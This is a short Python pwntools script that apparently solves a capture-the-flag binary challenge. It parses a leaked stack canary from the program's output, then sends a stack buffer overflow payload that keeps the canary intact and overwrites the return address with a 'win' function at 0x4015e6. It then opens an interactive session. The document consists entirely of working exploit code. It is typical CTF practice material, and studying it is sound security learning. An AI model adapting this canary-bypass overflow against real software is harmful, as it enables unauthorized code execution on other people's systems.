from pwn import *
from struct import pack
import time

context.terminal = ['kitty']

# io = gdb.debug('./chall', gdbscript='''
# # break main
# break *0x00000000004017e3
# continue
# ''')

io = ELF('./chall').process()

io.recvuntil(b'@ ')

line = io.recvline()
var_addr = line[:line.find(b', ')]
print(var_addr)

io.recvuntil(b'(')
canary = io.recvuntil(b')')[:-1]
print('canary:', canary)

print(str(canary)[4:-1])
print('canary_hex:', str(canary)[4:-1])
packed_canary = bytearray.fromhex(str(canary)[4:-1])
packed_canary.reverse()
# packed_canary.extend([0 for i in range(8)])
print('canary packed:', packed_canary)

# io.send(b'\x00'*24+packed_canary[0])
pwnmsg = bytearray.fromhex('00'*24)
pwnmsg.extend(packed_canary)
# win: 0x4015e6
pwnmsg.extend(bytearray.fromhex('0'*16))
pwnmsg.extend(bytearray.fromhex('e615400000000000'))

io.sendline(pwnmsg)

io.interactive()
